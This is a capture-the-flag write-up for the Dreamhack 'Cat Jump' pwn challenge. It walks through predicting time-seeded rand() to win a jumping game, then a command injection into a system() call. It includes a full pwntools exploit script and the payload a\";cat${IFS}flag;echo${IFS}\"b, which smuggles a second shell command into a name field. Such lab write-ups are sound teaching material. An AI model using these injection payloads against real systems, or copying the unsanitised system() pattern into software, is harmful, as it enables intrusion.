+++
date = '2026-05-06'
draft = false
title = 'Dreamhack Cat Jump Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn", "random"]
+++

## Challenge overview

고양이가 방해물을 피해 옥상으로 올라갈 수 있도록 도와주세요!

플래그 형식은 DH{...} 입니다.

---

```c
int PrintBanner()
{
  return puts(
           "                         .-.\n"
           "                          \\ \\\n"
           "                           \\ \\\n"
           "                            | |\n"
           "                            | |\n"
           "          /\\---/\\   _,---._ | |\n"
           "         /^   ^  \\,'       `. ;\n"
           "        ( O   O   )           ;\n"
           "         `.=o=__,'            \\\n"
           "           /         _,--.__   \\\n"
           "          /  _ )   ,'   `-. `-. \\\n"
           "         / ,' /  ,'        \\ \\ \\ \\\n"
           "        / /  / ,'          (,_)(,_)\n"
           "       (,;  (,,)      jrei\n");
}
```

```c
unsigned __int64 StartGame()
{
  unsigned int v0; // eax
  char v2; // [rsp+4h] [rbp-7Ch] BYREF
  char v3; // [rsp+5h] [rbp-7Bh]
  unsigned __int8 v4; // [rsp+6h] [rbp-7Ah]
  char v5; // [rsp+7h] [rbp-79h]
  double v6; // [rsp+8h] [rbp-78h]
  char v7[32]; // [rsp+10h] [rbp-70h] BYREF
  char s[72]; // [rsp+30h] [rbp-50h] BYREF
  unsigned __int64 v9; // [rsp+78h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  v0 = time(0);
  srand(v0);
  v3 = 0;
  v4 = 0;
  puts(aLetTheCatReach);
  sleep(1u);
  do
  {
    v5 = rand() % 2;
    do
    {
      printf("left jump='h', right jump='j': ");
      __isoc99_scanf("%c%*c", &v2);
    }
    while ( v2 != 'h' && v2 != 'l' );
    if ( v3 )
    {
      --v3;
      ++v4;
      puts(aTheCatPoweredU);
    }
    else
    {
      if ( (v2 != 'h' || !v5) && (v2 != 'l' || v5 == 1) )
      {
        puts(aTheCatGotStuck);
        return v9 - __readfsqword(0x28u);
      }
      ++v4;
      puts(aTheCatJumpedSu);
    }
    v6 = (double)rand() / 2147483647.0;
    if ( v6 < 0.1 )
    {
      puts(aTheCatFoundAnd);
      v3 = 3;
    }
  }
  while ( v4 <= 0x24u );
  puts("your cat has reached the roof!\n");
  printf(aLetPeopleKnowY);
  __isoc99_scanf("%31s", v7);
  snprintf(s, 0x40u, "echo \"%s\" > /tmp/cat_db", v7);
  system(s);
  printf("goodjob! ");
  system("cat /tmp/cat_db");
  return v9 - __readfsqword(0x28u);
}
```

## Identifying the vulnerabilities

So, we want to win this little game about a cat jumping places. The branch that decides whether we move forward or lose is this:

```python
      if ( (v2 != 'h' || !v5) && (v2 != 'l' || v5 == 1) )
      {
        puts(aTheCatGotStuck);
        return v9 - __readfsqword(0x28u);
      }
      ++v4;
      puts(aTheCatJumpedSu);
    }
```

And that `v5` is decided like `v5 = rand() % 2;`.

So, we just need to predict that random number. Well, I have a little section about that [here](irinasusca.github.io/writeup-blog/posts/pwn/#random). 

Then, we need to call `rand()` everytime they do, to keep in sync. In each loop, a `rand` happens twice. But before getting too invested in this, let's figure out what the local offset will be.

As a note, since the pwn challenge is hosted in Koreea and I'm from Romania, testing remotely will mean a completely different offset from the local one, for the random number.

Locally, it was at the exact perfect time; You can check by breaking at the `rand` call, stepping over, and checking `rax`.

![challenge-screenshot](offset.png#center)

Oh, and even though the text says *j* they meant *l* for *right jump*.

---

I made the *perfect* script but it kept crashing, so I investigated each `rand` call in pwndbg manually. And guess what - they were all perfect! The solution to this was adding a 3 second sleep between each choice. Then that stopped working, and I remembered that attaching gdb messed with the time, so I changed the index a little;

I even got to the end screen, where we are presented with a command injection opportunity.

![challenge-screenshot](echo.png#center)

First, I sent `a"; cat flag;`, to escape the string and inject our stuff, but I got an error, `sh: 1: Syntax error: Unterminated quoted string`. 

We weren't escaping the `"` properly, and the space was breaking the `%s`. But space can be easily escaped with `${IFS}` and we just had to add a backslash for the `"`.

So, the final payload looked like `p.sendline(b'a\";cat${IFS}flag;echo${IFS}\"b')`.

![challenge-screenshot](local.png#center)

Now, the annoying part, testing all the offsets for the remote binary. Or so I thought! It worked with the exact same one!! 

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
from ctypes import CDLL
import time

elf = ELF('/home/kali/Downloads/dreamhack/catjump/deploy/cat_jump')

context.arch = 'amd64'
cyberedu = 'host3.dreamhack.games:11082'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
#gdb.attach(p, gdbscript="""
#brva 0x1377
#brva 0x141d
#""")

#c code
libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
now = int(time.time())

i=11
j=1

for seed in range(now - 10, now + 10):
    libc.srand(seed)
    random = libc.rand()
    print(seed, random)
    if i==j:
    	random_number = random
    	random_seed = seed
    
    j=j+1
    
    
#save the seed at now + i

libc.srand(random_seed)

def predict():
    while(True):
        try:
            data = p.recvuntil(b": ")
            print(data)
            if b"reached the roof" in data:
                break
            v5 = libc.rand()
            print(f"v5 random: {v5}")
            #v5 impar -> send 'h'
            #v5 par -> send 'l'
            if v5 %2 == 0:
                p.sendline(b"l")
            else:
                p.sendline(b"h")
            #now call rand again for v6
            v6 = libc.rand()
            print(f"v6 random: {v6}")
            sleep(1)
        except:
            print("idfk")
            p.interactive()
    

predict()
#now for the last part; 
#close the str, insert payload, then open again
p.sendline(b'a\";cat${IFS}flag;echo${IFS}\"b')
p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/cat_jump.py)**.
